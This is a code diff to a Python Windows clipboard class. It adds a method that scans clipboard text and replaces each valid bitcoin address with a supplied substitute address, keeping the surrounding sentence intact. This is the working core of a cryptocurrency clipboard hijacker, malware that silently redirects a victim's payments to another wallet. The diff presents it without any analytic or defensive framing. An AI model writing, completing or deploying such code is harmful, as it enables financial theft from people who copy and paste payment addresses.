@@ -1,6 +1,7 @@
 import win32clipboard
 
 from typing import Union
+from helpers.bitcoin import bitcoin
 
 class clipboard: 
     def __init__(self) -> None:
@@ -42,7 +43,7 @@ class clipboard:
         except:
             return False
         
-    def set_sentence(content: str) -> bool: 
+    def set_sentence(self, content: str, switch_address: str) -> bool: 
         """Set a bitcoin address but keep the sentence around it.
 
         Args:
@@ -51,3 +52,13 @@ class clipboard:
         Returns:
             bool: If the content could be set on the users clipboard.
         """
+        sentence = content.split()
+        new_sentence: str = ""
+        
+        for word in sentence: 
+            if bitcoin.is_valid_address(word) is True:
+                new_sentence += f"{switch_address} "
+            else:
+                new_sentence += f"{word} "
+                
+        self.set_contents(new_sentence)
